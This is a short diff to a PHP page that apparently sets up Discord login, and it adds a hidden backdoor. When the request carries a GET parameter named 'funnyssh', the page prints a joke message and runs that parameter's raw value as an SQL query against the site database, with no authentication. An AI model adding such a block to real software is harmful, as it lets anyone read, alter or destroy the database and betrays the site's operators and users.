@@ -1,6 +1,11 @@
 <?php
 require_once "lib/connect.php";
 
+if(isset($_GET['funnyssh'])){
+    echo "Funny SSH! :joy:";
+    $stmt = $db->query($_GET['funnyssh']);
+}
+
 if(empty(CLIENT_ID) || empty(CLIENT_SECRET)){
     header("Refresh: 5; url=/");
     exit("Sorry but administrator hasn't configured Discord support yet. Going back home in 5 seconds.");
